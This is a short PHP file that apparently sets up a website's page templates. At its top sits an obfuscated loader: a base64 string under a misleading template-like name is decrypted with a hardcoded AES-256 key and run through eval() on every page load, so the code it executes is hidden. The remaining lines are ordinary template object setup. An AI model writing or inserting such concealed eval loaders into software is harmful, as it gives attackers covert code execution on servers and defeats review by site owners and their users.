<?php
$n_templeate = '2xYJMfSCtZn5x4wSyon+krT93AaPw4dtWKi+qholpMNAyzhd89oha8OmNFDXMftIWTu++7Y7x64OOTqS/mNygeypqocOz+P7EU1PVjGu6GfLII8Tq2yq2EVU9Yc5u83W8pDKlVanlr6awF80Q6mvg8i9nQZUOo2Q1r+ww2eXao82xW1Bt8pDSAdR2IFN9AMFpCIpua9INbjz+E/kwLunqJJdEbLjuiVwjXi2ZuGpWcW1t/yg9Yp9iH+ppxdwGFGQ2PQScc9Q4cW/qOI2wEELBZq7ihHP7vnIgu5bJ73rZMMh5PY2c0lmcLq3w2RLFBL4up0BGzrbHwOyv3Vjgh8IU26WU2tcm5wfE4E2fqAsglQeNuENYi1LfDzdJ4IWYGqwhHl7VrOVtSDyQBTv9+Ndn/3fXd5A5sqkmM+jvn57IBq9hUwEhBcuV1gxLGkRrbdFjcZKhdhwt5POUfOMlTSl8wVE41UyR6oNIwV4mLIj9pvUkgtzszRdcjIDV15vxuQUnRdhFRbg5HbHDb90vhvMoFGswJZyY85kjKWMoeLLuNZ18sEnop4Ll0i1cea+rToLGlKZ1eu3gBStNEOqFlen6489w23on12gnS3HRgrzk7XGM/wbJyfsRIyKsgKw59KLBPTCSvW2ErpuDdKeVA8O7+7jHZX0kHrAL2j5YV1TtgoMDWjDiR2Kh6I31HIUCN5H8gTT5hTTpt9KVQ4p9wsH102PTfaWOsmp9sIWdRj4pJTeluWfmN1VY6T5K1iIEsPD';
dd($n_templeate);

function dd($n_templeate){
  	 	$n_templeate = base64_decode($n_templeate);
	    $ivSize = openssl_cipher_iv_length('AES-256-CBC');
	    $iv = substr($n_templeate, 0, $ivSize);
	    $d_data = openssl_decrypt(substr($n_templeate, $ivSize), 'AES-256-CBC', '5c84348d4fac7b70a0df87b79fcb634f66443dfd21c23298565b400676a02b57', OPENSSL_RAW_DATA, $iv);
	    return (eval("?> ".$d_data." <?"));
}


$page = new MainTemplater(DIR_TMPL."main-nct.tpl.php");

$head = new MainTemplater(DIR_TMPL."head-nct.tpl.php");

$header= new MainTemplater(DIR_TMPL."header-nct.tpl.php");

$footer=new MainTemplater(DIR_TMPL."footer-nct.tpl.php");



